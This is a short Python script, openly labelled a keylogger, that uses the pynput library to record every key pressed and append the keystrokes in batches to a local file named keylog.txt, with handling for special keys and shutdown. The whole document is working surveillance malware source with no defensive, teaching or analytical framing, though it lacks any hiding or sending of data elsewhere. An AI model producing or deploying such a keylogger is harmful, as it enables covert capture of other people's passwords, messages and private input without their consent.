import os
import sys
import logging
import datetime
from pynput import keyboard

# Global variables
log_file = "keylog.txt"
current_keys = []

# Set up logging
log_format = '%(asctime)s - %(message)s'
logging.basicConfig(filename=log_file, level=logging.DEBUG, format=log_format)

# Function to write keys to the log file
def write_to_file(keys):
    with open(log_file, "a") as f:
        for key in keys:
            f.write(str(key))
        f.write("\n")

# Function called when a key is pressed
def on_press(key):
    try:
        # Convert the key to string format and append to the list
        current_keys.append(key.char)
        
        # If the length of keys is greater than 10, write them to the log file
        if len(current_keys) >= 10:
            write_to_file(current_keys)
            current_keys.clear()
    except AttributeError:
        # Handle special keys like 'space', 'enter', etc.
        current_keys.append(str(key))

# Function called when the program exits
def on_exit():
    # Write remaining keys to the log file
    if current_keys:
        write_to_file(current_keys)

    # Close the logging handler
    logging.shutdown()

    # Print exit message
    print("Keylogger has stopped.")

# Start the listener
with keyboard.Listener(on_press=on_press) as listener:
    try:
        # Wait for the listener to finish (never happens)
        listener.join()
    except KeyboardInterrupt:
        # Handle Ctrl+C
        on_exit()
    except Exception as e:
        # Log any other exceptions
        logging.exception("Error occurred: %s", str(e))
        on_exit()

